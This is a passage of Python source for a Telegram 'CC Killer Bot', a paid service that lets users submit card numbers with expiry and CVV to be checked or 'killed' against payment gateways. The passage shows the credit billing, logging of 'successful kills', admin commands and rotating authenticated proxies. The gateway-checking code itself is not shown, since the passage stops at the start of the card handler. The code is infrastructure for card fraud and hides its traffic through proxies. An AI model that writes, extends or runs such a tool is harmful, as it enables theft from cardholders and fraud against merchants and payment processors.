        result = self.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
        return result[0][0] if result else 0

    def set_banned(self, user_id: int, banned: bool) -> bool:
        """Set or clear ban status."""
        try:
            self.execute(
                "UPDATE users SET is_banned = ? WHERE user_id = ?",
                (1 if banned else 0, user_id)
            )
            return True
        except Exception as e:
            logger.error("Failed to set ban for %d: %s", user_id, e)
            return False

    def log_transaction(self, user_id: int, card_number: str, status: str, gateway_result: str, proxy_used: str = ""):
        """Log a transaction for auditing."""
        try:
            self.execute(
                "INSERT INTO transactions (user_id, card_number, status, gateway_result, proxy_used) VALUES (?, ?, ?, ?, ?)",
                (user_id, card_number, status, gateway_result, proxy_used)
            )
        except Exception as e:
            logger.error("Failed to log transaction: %s", e)

    def log_admin_action(self, admin_id: int, action: str, target_id: int, details: str = ""):
        """Log admin actions."""
        try:
            self.execute(
                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
                (admin_id, action, target_id, details)
            )
        except Exception as e:
            logger.error("Failed to log admin action: %s", e)
    
    def update_user_stats(self, user_id: int, successful: bool = False):
        """Update user statistics."""
        try:
            self.execute(
                "UPDATE users SET total_checks = total_checks + 1, last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
                (user_id,)
            )
            if successful:
                self.execute(
                    "UPDATE users SET successful_kills = successful_kills + 1 WHERE user_id = ?",
                    (user_id,)
                )
        except Exception as e:
            logger.error("Failed to update user stats: %s", e)
    
    def set_preferred_proxy(self, user_id: int, proxy_string: str) -> bool:
        """Set a user's preferred proxy."""
        try:
            self.execute(
                "UPDATE users SET preferred_proxy = ? WHERE user_id = ?",
                (proxy_string, user_id)
            )
            return True
        except Exception as e:
            logger.error("Failed to set preferred proxy: %s", e)
            return False
    
    def get_preferred_proxy(self, user_id: int) -> str:
        """Get user's preferred proxy."""
        result = self.execute("SELECT preferred_proxy FROM users WHERE user_id = ?", (user_id,))
        return result[0][0] if result and result[0][0] else ""

# -----------------------------------------------------------------------------
# TELEGRAM BOT WRAPPER (ULTRA MODERN UI/UX)
# -----------------------------------------------------------------------------
class CCKillerBot:
    def __init__(self, token: str, owner_id: int):
        self.token = token
        self.owner_id = owner_id
        self.db = Database()
        self.proxy_manager = ProxyManager()
        self.bot = telebot.TeleBot(token, threaded=True, parse_mode="Markdown")
        self.running = True
        self._register_handlers()
        
    def _register_handlers(self):
        """Register all message handlers."""
        @self.bot.message_handler(commands=['start', 'help'])
        def send_welcome(message):
            self._handle_welcome(message)

        @self.bot.message_handler(commands=['credits'])
        def check_credits(message):
            self._handle_credits(message)

        @self.bot.message_handler(commands=['addcredits'])
        def add_credits(message):
            self._handle_add_credits(message)

        @self.bot.message_handler(commands=['ban'])
        def ban_user(message):
            self._handle_ban(message)

        @self.bot.message_handler(commands=['unban'])
        def unban_user(message):
            self._handle_unban(message)

        @self.bot.message_handler(commands=['stats'])
        def show_stats(message):
            self._handle_stats(message)

        @self.bot.message_handler(commands=['broadcast'])
        def broadcast(message):
            self._handle_broadcast(message)

        @self.bot.message_handler(commands=['addproxy'])
        def add_proxy(message):
            self._handle_add_proxy(message)

        @self.bot.message_handler(commands=['listproxy'])
        def list_proxy(message):
            self._handle_list_proxy(message)

        @self.bot.message_handler(commands=['proxycheck'])
        def proxy_check(message):
            self._handle_proxy_check(message)

        @self.bot.message_handler(commands=['proxyclear'])
        def proxy_clear(message):
            self._handle_proxy_clear(message)

        @self.bot.message_handler(commands=['proxyselect'])
        def proxy_select(message):
            self._handle_proxy_select(message)

        @self.bot.message_handler(commands=['proxystats'])
        def proxy_stats(message):
            self._handle_proxy_stats(message)

        @self.bot.message_handler(commands=['proxyremove'])
        def proxy_remove(message):
            self._handle_proxy_remove(message)

        @self.bot.message_handler(commands=['profile'])
        def profile(message):
            self._handle_profile(message)

        @self.bot.message_handler(commands=['history'])
        def history(message):
            self._handle_history(message)

        @self.bot.message_handler(func=lambda m: True)
        def handle_all(message):
            self._handle_all(message)

    # -------------------------------------------------------------------------
    # UI HELPERS
    # -------------------------------------------------------------------------
    def _create_modern_header(self, title: str, icon: str = "⚡", subtitle: str = "") -> str:
        header = f"╔{Styles.BORDER}╗\n"
        header += f"║ {icon}  {title.upper()}  {icon} ║\n"
        if subtitle:
            header += f"║ {subtitle} ║\n"
        header += f"╠{Styles.BORDER}╣"
        return header

    def _create_modern_footer(self, version: str = "v3.2") -> str:
        return f"╚{Styles.BORDER}╝\n*{version} • {datetime.now().strftime('%Y-%m-%d %H:%M')}*"

    def _create_card_display(self, card_number: str, exp_month: str, exp_year: str, cvv: str) -> str:
        masked = f"{card_number[:4]} **** **** {card_number[-4:]}"
        return f"┌─────────────────────┐\n│ {Styles.CARD}  {masked} │\n│ 📅 {exp_month}/{exp_year}  🔐 {cvv} │\n└─────────────────────┘"

    def _create_progress_animation(self, stage: int, total: int = 5) -> str:
        percent = int((stage + 1) / total * 100)
        bar = Styles.progress_bar(percent, 20, "▓", "░")
        stages_text = ["INIT", "AUTH", "PROCESS", "VERIFY", "DONE"]
        current = stages_text[stage] if stage < len(stages_text) else "DONE"
        return f"`{bar}`\n*Stage {stage+1}/{total}: {current}*"

    # -------------------------------------------------------------------------
    # HANDLER IMPLEMENTATIONS
    # -------------------------------------------------------------------------
    def _ensure_user(self, user_id: int) -> bool:
        """Ensure user exists in DB."""
        if not self.db.get_user(user_id):
            return self.db.create_user(user_id, DEFAULT_CREDITS)
        return True

    def _is_owner(self, user_id: int) -> bool:
        """Check if user is bot owner."""
        return user_id == self.owner_id

    def _is_banned(self, user_id: int) -> bool:
        """Check if user is banned."""
        user = self.db.get_user(user_id)
        return user.get("is_banned", 0) == 1 if user else False

    def _handle_welcome(self, message):
        """Handle /start and /help commands."""
        user_id = message.from_user.id
        self._ensure_user(user_id)
        
        welcome_text = (
            f"{self._create_modern_header('CC KILLER BOT', '🔥', '⚡ Advanced Card Checker')}\n"
            f"┃ {Styles.STAR} *Welcome to the ultimate card validation bot*\n"
            f"┃ {Styles.BULLET} Check cards through multiple gateways\n"
            f"┃ {Styles.BULLET} Auto-rotating proxy system with auth support\n"
            f"┃ {Styles.BULLET} Real-time results with modern UI\n"
            f"╠{Styles.BORDER}╣\n"
            f"┃ *📋 COMMANDS*\n"
            f"┃ {Styles.ARROW} Send a card: `xxxxxxxxxxxxxxxx|mm|yy|cvv`\n"
            f"┃ {Styles.ARROW} `/credits` - Check balance\n"
            f"┃ {Styles.ARROW} `/profile` - Your stats\n"
            f"┃ {Styles.ARROW} `/history` - Check history\n"
            f"┃ {Styles.ARROW} `/help` - This menu\n"
            f"╠{Styles.BORDER}╣\n"
            f"┃ *🌐 PROXY COMMANDS*\n"
            f"┃ {Styles.ARROW} `/addproxy list` - Add proxies\n"
            f"┃ {Styles.ARROW} `/listproxy` - View proxies\n"
            f"┃ {Styles.ARROW} `/proxystats` - Proxy stats\n"
            f"┃ {Styles.ARROW} `/proxycheck` - Check all proxies\n"
            f"┃ {Styles.ARROW} `/proxyclear` - Clear dead proxies\n"
            f"┃ {Styles.ARROW} `/proxyselect proxy` - Choose proxy\n"
            f"┃ {Styles.ARROW} `/proxyremove proxy` - Remove proxy\n"
            f"╠{Styles.BORDER}╣\n"
            f"┃ *👑 ADMIN COMMANDS*\n"
            f"┃ {Styles.ARROW} `/addcredits id amount` - Add credits\n"
            f"┃ {Styles.ARROW} `/ban id` - Ban user\n"
            f"┃ {Styles.ARROW} `/unban id` - Unban user\n"
            f"┃ {Styles.ARROW} `/stats` - Bot statistics\n"
            f"┃ {Styles.ARROW} `/broadcast msg` - Broadcast\n"
            f"┃ {Styles.ARROW} `/addproxy` - Add proxies\n"
            f"{self._create_modern_footer('v3.2')}\n\n"
            f"*Cost:* {KILL_COST} credit/check • Contact owner to purchase"
        )
        self.bot.reply_to(message, welcome_text, parse_mode="Markdown")

    def _handle_credits(self, message):
        """Handle /credits command."""
        user_id = message.from_user.id
        self._ensure_user(user_id)
        credits = self.db.get_credits(user_id)
        
        text = (
            f"{self._create_modern_header('CREDIT BALANCE', '💰')}\n"
            f"┃ {Styles.CREDIT}  Your Balance\n"
            f"┃ ═══════════════════════════\n"
            f"┃ {Styles.BULLET} Credits: *{credits}*\n"
            f"┃ {Styles.BULLET} Cost/Check: *{KILL_COST} credit*\n"
            f"┃ {Styles.BULLET} Available Checks: *{credits // KILL_COST if credits >= KILL_COST else 0}*\n"
            f"{self._create_modern_footer()}"
        )
        self.bot.reply_to(message, text, parse_mode="Markdown")

    def _handle_profile(self, message):
        """Handle /profile command."""
        user_id = message.from_user.id
        self._ensure_user(user_id)
        user = self.db.get_user(user_id)
        
        if not user:
            self.bot.reply_to(message, "❌ User not found.")
            return
        
        text = (
            f"{self._create_modern_header('USER PROFILE', '👤')}\n"
            f"┃ {Styles.USER}  User ID: `{user['user_id']}`\n"
            f"┃ {Styles.CREDIT}  Credits: *{user['credits']}*\n"
            f"┃ {Styles.BAR_CHART}  Total Checks: *{user.get('total_checks', 0)}*\n"
            f"┃ {Styles.SUCCESS}  Successful Kills: *{user.get('successful_kills', 0)}*\n"
            f"┃ {Styles.PROXY}  Preferred Proxy: `{user.get('preferred_proxy', 'None')[:30]}...`\n"
            f"┃ {Styles.CLOCK}  Registered: {user.get('registered_at', 'Unknown')[:10]}\n"
            f"{self._create_modern_footer()}"
        )
        self.bot.reply_to(message, text, parse_mode="Markdown")

    def _handle_history(self, message):
        """Handle /history command."""
        user_id = message.from_user.id
        self._ensure_user(user_id)
        
        transactions = self.db.execute(
            "SELECT card_number, status, gateway_result, proxy_used, created_at FROM transactions WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
            (user_id,)
        )
        
        if not transactions:
            self.bot.reply_to(message, "📭 No transaction history found.")
            return
        
        lines = [f"{self._create_modern_header('TRANSACTION HISTORY', '📋')}"]
        for i, (card, status, result, proxy, created) in enumerate(transactions, 1):
            status_icon = "✅" if status == "KILLED" else "❌"
            lines.append(f"┃ {i}. {status_icon} {card} {status_icon}")
            lines.append(f"┃    {result[:30]}... | Proxy: {proxy[:20] if proxy else 'None'}")
            lines.append(f"┃    {created[:10]}")
            if i < len(transactions):
                lines.append(f"┃ {Styles.THIN_BORDER}")
        
        lines.append(self._create_modern_footer())
        self.bot.reply_to(message, "\n".join(lines), parse_mode="Markdown")

    def _handle_add_credits(self, message):
        """Handle /addcredits command (admin only)."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        args = message.text.split()
        if len(args) != 3:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('ERROR', '❌')}\n"
                f"┃ *Usage:* `/addcredits user_id amount`\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        try:
            target_id = int(args[1])
            amount = int(args[2])
            if amount <= 0:
                self.bot.reply_to(message, "❌ Amount must be positive.")
                return
        except ValueError:
            self.bot.reply_to(message, "❌ Invalid user_id or amount. Use numeric values.")
            return

        self._ensure_user(target_id)
        new_balance = self.db.update_credits(target_id, amount)
        self.db.log_admin_action(user_id, "addcredits", target_id, f"amount={amount}")
        
        self.bot.reply_to(
            message,
            f"{self._create_modern_header('CREDITS ADDED', '✅')}\n"
            f"┃ {Styles.USER} User: `{target_id}`\n"
            f"┃ {Styles.CREDIT} Amount: *+{amount}*\n"
            f"┃ {Styles.CREDIT} New Balance: *{new_balance}*\n"
            f"{self._create_modern_footer()}",
            parse_mode="Markdown"
        )
        
        try:
            self.bot.send_message(
                target_id,
                f"{self._create_modern_header('CREDITS ADDED', '💰')}\n"
                f"┃ *{amount}* credits have been added\n"
                f"┃ New balance: *{new_balance}*\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    def _handle_ban(self, message):
        """Handle /ban command (admin only)."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        args = message.text.split()
        if len(args) != 2:
            self.bot.reply_to(message, "❌ *Usage:* `/ban user_id`", parse_mode="Markdown")
            return

        try:
            target_id = int(args[1])
        except ValueError:
            self.bot.reply_to(message, "❌ Invalid user_id. Use numeric value.")
            return

        if self.db.set_banned(target_id, True):
            self.db.log_admin_action(user_id, "ban", target_id, "")
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('USER BANNED', '⛔')}\n"
                f"┃ User `{target_id}` has been banned\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            try:
                self.bot.send_message(
                    target_id,
                    f"{self._create_modern_header('BANNED', '⛔')}\n"
                    f"┃ You have been banned from using this bot\n"
                    f"{self._create_modern_footer()}",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        else:
            self.bot.reply_to(message, "❌ Failed to ban user.")

    def _handle_unban(self, message):
        """Handle /unban command (admin only)."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        args = message.text.split()
        if len(args) != 2:
            self.bot.reply_to(message, "❌ *Usage:* `/unban user_id`", parse_mode="Markdown")
            return

        try:
            target_id = int(args[1])
        except ValueError:
            self.bot.reply_to(message, "❌ Invalid user_id. Use numeric value.")
            return

        if self.db.set_banned(target_id, False):
            self.db.log_admin_action(user_id, "unban", target_id, "")
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('USER UNBANNED', '✅')}\n"
                f"┃ User `{target_id}` has been unbanned\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            try:
                self.bot.send_message(
                    target_id,
                    f"{self._create_modern_header('UNBANNED', '✅')}\n"
                    f"┃ You have been unbanned. You can now use the bot.\n"
                    f"{self._create_modern_footer()}",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        else:
            self.bot.reply_to(message, "❌ Failed to unban user.")

    def _handle_stats(self, message):
        """Handle /stats command (admin only)."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        try:
            total_users = self.db.execute("SELECT COUNT(*) FROM users")[0][0]
            banned_users = self.db.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")[0][0]
            total_transactions = self.db.execute("SELECT COUNT(*) FROM transactions")[0][0]
            total_credits = self.db.execute("SELECT SUM(credits) FROM users")[0][0] or 0
            proxy_stats = self.proxy_manager.get_stats()

            text = (
                f"{self._create_modern_header('BOT STATISTICS', '📊')}\n"
                f"┃ {Styles.USER} Users: *{total_users}* (Banned: {banned_users})\n"
                f"┃ {Styles.CARD} Transactions: *{total_transactions}*\n"
                f"┃ {Styles.CREDIT} Total Credits: *{total_credits}*\n"
                f"┃ {Styles.PROXY} Proxies: *{proxy_stats['alive']}* alive / {proxy_stats['total']} total\n"
                f"┃ {Styles.PROXY} Auth Proxies: *{proxy_stats['auth_count']}*\n"
                f"┃ {Styles.CLOCK} Avg Response: *{proxy_stats['avg_response']}s*\n"
                f"┃ {Styles.BAR_CHART} Cost/Check: *{KILL_COST} credit*\n"
                f"{self._create_modern_footer()}"
            )
            self.bot.reply_to(message, text, parse_mode="Markdown")
        except Exception as e:
            logger.error("Stats error: %s", e)
            self.bot.reply_to(message, "❌ Failed to fetch statistics.")

    def _handle_broadcast(self, message):
        """Handle /broadcast command (admin only)."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        text = message.text.replace("/broadcast", "", 1).strip()
        if not text:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('ERROR', '❌')}\n"
                f"┃ *Usage:* `/broadcast message`\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        users = self.db.execute("SELECT user_id FROM users WHERE is_banned = 0")
        sent = 0
        failed = 0
        
        status_msg = self.bot.reply_to(
            message,
            f"{self._create_modern_header('BROADCASTING', '📢')}\n"
            f"┃ Sending to {len(users)} users...\n"
            f"{self._create_modern_footer()}",
            parse_mode="Markdown"
        )
        
        for (uid,) in users:
            try:
                self.bot.send_message(
                    uid,
                    f"{self._create_modern_header('ANNOUNCEMENT', '📢')}\n"
                    f"┃ {text}\n"
                    f"{self._create_modern_footer()}",
                    parse_mode="Markdown"
                )
                sent += 1
                time.sleep(0.05)
            except Exception:
                failed += 1
            
            # Update progress every 50 users
            if sent % 50 == 0:
                self.bot.edit_message_text(
                    f"{self._create_modern_header('BROADCASTING', '📢')}\n"
                    f"┃ Sent: *{sent}* | Failed: *{failed}* | Remaining: *{len(users) - sent - failed}*\n"
                    f"{self._create_modern_footer()}",
                    chat_id=status_msg.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode="Markdown"
                )
        
        self.db.log_admin_action(user_id, "broadcast", 0, f"sent={sent}, failed={failed}")
        self.bot.edit_message_text(
            f"{self._create_modern_header('BROADCAST COMPLETE', '✅')}\n"
            f"┃ Sent: *{sent}* | Failed: *{failed}*\n"
            f"{self._create_modern_footer()}",
            chat_id=status_msg.chat.id,
            message_id=status_msg.message_id,
            parse_mode="Markdown"
        )

    # -------------------------------------------------------------------------
    # PROXY HANDLERS
    # -------------------------------------------------------------------------
    def _handle_add_proxy(self, message):
        """Handle /addproxy command - add and check proxies with auth support."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('PROXY ADD', '🌐')}\n"
                f"┃ *Supported formats:*\n"
                f"┃ {Styles.BULLET} `ip:port`\n"
                f"┃ {Styles.BULLET} `ip:port:user:pass`\n"
                f"┃ {Styles.BULLET} `user:pass@ip:port`\n"
                f"┃ {Styles.BULLET} `http://user:pass@ip:port`\n"
                f"┃ {Styles.THIN_BORDER}\n"
                f"┃ *Example:* `/addproxy 192.168.1.1:8080 user:pass@10.0.0.1:3128`\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        proxy_strings = args[1].split()
        if not proxy_strings:
            self.bot.reply_to(message, "❌ No proxies provided.")
            return

        if len(proxy_strings) > 100:
            self.bot.reply_to(message, "❌ Maximum 100 proxies per batch.")
            return

        status_msg = self.bot.reply_to(
            message,
            f"{self._create_modern_header('PROXY CHECK', '🌐')}\n"
            f"┃ {Styles.PROXY} Checking {len(proxy_strings)} proxies...\n"
            f"┃ {Styles.CLOCK} This may take a moment\n"
            f"{self._create_modern_footer()}",
            parse_mode="Markdown"
        )

        try:
            def progress_callback(current, total):
                if current % 5 == 0 or current == total:
                    try:
                        percent = int(current / total * 100)
                        bar = Styles.progress_bar(percent, 20, "▓", "░")
                        self.bot.edit_message_text(
                            f"{self._create_modern_header('PROXY CHECK', '🌐')}\n"
                            f"┃ {bar}\n"
                            f"┃ {Styles.PROXY} Checking {current}/{total}...\n"
                            f"{self._create_modern_footer()}",
                            status_msg.chat.id,
                            status_msg.message_id,
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass

            alive, dead, alive_list, dead_list = self.proxy_manager.add_proxies(
                proxy_strings, self.proxy_manager
            )
            
            text = (
                f"{self._create_modern_header('PROXY RESULTS', '✅')}\n"
                f"┃ {Styles.SUCCESS} Alive: *{alive}*\n"
                f"┃ {Styles.CROSS} Dead: *{dead}*\n"
                f"┃ {Styles.PROXY} Total: *{alive + dead}*\n"
                f"┃ {Styles.THIN_BORDER}\n"
            )
            
            if alive_list:
                display = alive_list[:10]
                text += f"┃ *First {len(display)} alive proxies:*\n"
                for p in display:
                    # Mask credentials for display
                    display_p = p
                    if '@' in p:
                        parts = p.split('@')
                        if len(parts) == 2:
                            auth, host = parts
                            if ':' in auth:
                                user, _ = auth.split(':', 1)
                                display_p = f"{user}:****@{host}"
                    text += f"┃  {Styles.BULLET} `{display_p}`\n"
                if len(alive_list) > 10:
                    text += f"┃  ... and {len(alive_list) - 10} more\n"
            else:
                text += f"┃ {Styles.WARN} No alive proxies found\n"
            
            if dead_list and len(dead_list) <= 5:
                text += f"┃ {Styles.THIN_BORDER}\n"
                text += f"┃ *Dead proxies:*\n"
                for p in dead_list[:5]:
                    text += f"┃  {Styles.CROSS} `{p}`\n"
            
            text += self._create_modern_footer()
            self.bot.edit_message_text(text, status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")
            
        except Exception as e:
            logger.error("Proxy add error: %s", e)
            self.bot.edit_message_text(
                f"{self._create_modern_header('ERROR', '❌')}\n"
                f"┃ Failed to process proxies: {str(e)[:50]}\n"
                f"{self._create_modern_footer()}",
                status_msg.chat.id,
                status_msg.message_id,
                parse_mode="Markdown"
            )

    def _handle_list_proxy(self, message):
        """Handle /listproxy command - list all proxies with auth info."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        args = message.text.split()
        alive_only = True
        limit = 50
        
        if len(args) > 1:
            if args[1].lower() == 'all':
                alive_only = False
            try:
                limit = int(args[1])
            except ValueError:
                pass

        proxies = self.proxy_manager.get_proxy_list(alive_only, min(limit, 200))
        
        if not proxies:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('PROXY LIST', '📋')}\n"
                f"┃ No proxies found\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        stats = self.proxy_manager.get_stats()
        
        text = (
            f"{self._create_modern_header('PROXY LIST', '🌐')}\n"
            f"┃ {Styles.PROXY} Total: *{stats['total']}* | Alive: *{stats['alive']}* | Dead: *{stats['dead']}*\n"
            f"┃ {Styles.PROXY} Auth: *{stats['auth_count']}* | Avg Response: *{stats['avg_response']}s*\n"
            f"┃ {Styles.THIN_BORDER}\n"
        )
        
        for i, p in enumerate(proxies[:30], 1):
            status = "✅" if p['is_alive'] else "❌"
            auth_tag = "🔐" if p['has_auth'] else ""
            text += f"┃ {i:2d}. {status} {auth_tag} `{p['display']}`\n"
            text += f"┃     {p['country']} | {p['response_time']:.2f}s | {p['success_count']}✓ {p['fail_count']}✗\n"
        
        if len(proxies) > 30:
            text += f"┃ ... and {len(proxies) - 30} more proxies\n"
        
        text += self._create_modern_footer()
        self.bot.reply_to(message, text, parse_mode="Markdown")

    def _handle_proxy_check(self, message):
        """Handle /proxycheck command - check all proxies."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        status_msg = self.bot.reply_to(
            message,
            f"{self._create_modern_header('PROXY CHECK', '🔍')}\n"
            f"┃ Checking all proxies...\n"
            f"{self._create_modern_footer()}",
            parse_mode="Markdown"
        )

        proxies = self.proxy_manager.get_proxy_list(False, 500)
        if not proxies:
            self.bot.edit_message_text(
                f"{self._create_modern_header('PROXY CHECK', 'ℹ️')}\n"
                f"┃ No proxies to check\n"
                f"{self._create_modern_footer()}",
                status_msg.chat.id,
                status_msg.message_id,
                parse_mode="Markdown"
            )
            return

        proxy_strings = [p['proxy_string'] for p in proxies]
        
        def progress_callback(current, total):
            if current % 5 == 0 or current == total:
                try:
                    percent = int(current / total * 100)
                    bar = Styles.progress_bar(percent, 20, "▓", "░")
                    self.bot.edit_message_text(
                        f"{self._create_modern_header('PROXY CHECK', '🔍')}\n"
                        f"┃ {bar}\n"
                        f"┃ Checking {current}/{total}...\n"
                        f"{self._create_modern_footer()}",
                        status_msg.chat.id,
                        status_msg.message_id,
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
        
        results = self.proxy_manager.check_proxies(proxy_strings, progress_callback)
        
        alive = sum(1 for r in results if r)
        
        # Update database
        for ps, is_alive in zip(proxy_strings, results):
            if is_alive:
                proxy = self.proxy_manager.get_proxy_by_string(ps)
                if proxy:
                    self.proxy_manager._update_proxy_usage(proxy['id'])
            else:
                self.proxy_manager.mark_proxy_dead(ps)
        
        self.proxy_manager._load_proxies()
        
        text = (
            f"{self._create_modern_header('PROXY CHECK COMPLETE', '✅')}\n"
            f"┃ {Styles.PROXY} Checked: *{len(proxies)}* proxies\n"
            f"┃ {Styles.SUCCESS} Alive: *{alive}*\n"
            f"┃ {Styles.CROSS} Dead: *{len(proxies) - alive}*\n"
            f"{self._create_modern_footer()}"
        )
        self.bot.edit_message_text(text, status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")

    def _handle_proxy_clear(self, message):
        """Handle /proxyclear command - clear dead proxies."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        removed = self.proxy_manager.clear_dead_proxies()
        
        text = (
            f"{self._create_modern_header('PROXY CLEANUP', '🧹')}\n"
            f"┃ {Styles.SUCCESS} Removed *{removed}* dead proxies\n"
            f"┃ {Styles.PROXY} Alive proxies: *{self.proxy_manager.get_stats()['alive']}*\n"
            f"{self._create_modern_footer()}"
        )
        self.bot.reply_to(message, text, parse_mode="Markdown")

    def _handle_proxy_select(self, message):
        """Handle /proxyselect command - set preferred proxy."""
        user_id = message.from_user.id
        args = message.text.split(maxsplit=1)
        
        if len(args) < 2:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('PROXY SELECT', '🌐')}\n"
                f"┃ *Usage:* `/proxyselect proxy_string`\n"
                f"┃ Or: `/proxyselect auto` - Auto-rotation\n"
                f"┃ Or: `/proxyselect none` - No proxy\n"
                f"┃ {Styles.THIN_BORDER}\n"
                f"┃ *Supported formats:*\n"
                f"┃ `ip:port`\n"
                f"┃ `ip:port:user:pass`\n"
                f"┃ `user:pass@ip:port`\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        proxy = args[1].strip()
        
        if proxy.lower() == 'none':
            self.db.set_preferred_proxy(user_id, '')
            text = (
                f"{self._create_modern_header('PROXY SELECT', '✅')}\n"
                f"┃ Proxy disabled. Using auto-rotation.\n"
                f"{self._create_modern_footer()}"
            )
        elif proxy.lower() == 'auto':
            self.db.set_preferred_proxy(user_id, 'AUTO')
            text = (
                f"{self._create_modern_header('PROXY SELECT', '✅')}\n"
                f"┃ Auto-rotation enabled.\n"
                f"{self._create_modern_footer()}"
            )
        else:
            # Validate proxy format
            parsed = self.proxy_manager._parse_proxy_string(proxy)
            if not parsed:
                text = (
                    f"{self._create_modern_header('PROXY SELECT', '❌')}\n"
                    f"┃ Invalid proxy format.\n"
                    f"┃ Supported: `ip:port`, `ip:port:user:pass`, `user:pass@ip:port`\n"
                    f"{self._create_modern_footer()}"
                )
            else:
                self.db.set_preferred_proxy(user_id, parsed['proxy_string'])
                text = (
                    f"{self._create_modern_header('PROXY SELECT', '✅')}\n"
                    f"┃ Preferred proxy set to:\n"
                    f"┃ `{parsed['proxy_string'][:50]}...`\n"
                    f"{self._create_modern_footer()}"
                )
        
        self.bot.reply_to(message, text, parse_mode="Markdown")

    def _handle_proxy_remove(self, message):
        """Handle /proxyremove command - remove a proxy."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('PROXY REMOVE', '🗑️')}\n"
                f"┃ *Usage:* `/proxyremove proxy_string`\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        proxy = args[1].strip()
        
        # Parse to get canonical form
        parsed = self.proxy_manager._parse_proxy_string(proxy)
        if not parsed:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('PROXY REMOVE', '❌')}\n"
                f"┃ Invalid proxy format.\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return
        
        if self.proxy_manager.remove_proxy(parsed['proxy_string']):
            text = (
                f"{self._create_modern_header('PROXY REMOVED', '✅')}\n"
                f"┃ Proxy removed successfully.\n"
                f"{self._create_modern_footer()}"
            )
        else:
            text = (
                f"{self._create_modern_header('PROXY REMOVE', 'ℹ️')}\n"
                f"┃ Proxy not found.\n"
                f"{self._create_modern_footer()}"
            )
        self.bot.reply_to(message, text, parse_mode="Markdown")

    def _handle_proxy_stats(self, message):
        """Handle /proxystats command - detailed proxy statistics."""
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            self.bot.reply_to(message, "⛔ *Restricted:* Admin only.", parse_mode="Markdown")
            return

        stats = self.proxy_manager.get_stats()
        
        text = (
            f"{self._create_modern_header('PROXY STATISTICS', '📊')}\n"
            f"┃ {Styles.PROXY} Total Proxies: *{stats['total']}*\n"
            f"┃ {Styles.SUCCESS} Alive: *{stats['alive']}*\n"
            f"┃ {Styles.CROSS} Dead: *{stats['dead']}*\n"
            f"┃ {Styles.LOCK} Auth Enabled: *{stats['auth_count']}*\n"
            f"┃ {Styles.CLOCK} Avg Response: *{stats['avg_response']}s*\n"
            f"┃ {Styles.THIN_BORDER}\n"
        )
        
        if stats['top_countries']:
            text += "┃ *Top Countries:*\n"
            for c in stats['top_countries']:
                text += f"┃  {Styles.BULLET} {c['country']}: *{c['count']}*\n"
        else:
            text += "┃ No country data available\n"
        
        text += self._create_modern_footer()
        self.bot.reply_to(message, text, parse_mode="Markdown")

    # -------------------------------------------------------------------------
    # MAIN CARD PROCESSING
    # -------------------------------------------------------------------------
    def _handle_all(self, message):
        """Handle all non-command messages (card checks)."""
        user_id = message.from_user.id
        self._ensure_user(user_id)

        if self._is_banned(user_id):
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('BANNED', '⛔')}\n"
                f"┃ You are banned from using this bot\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

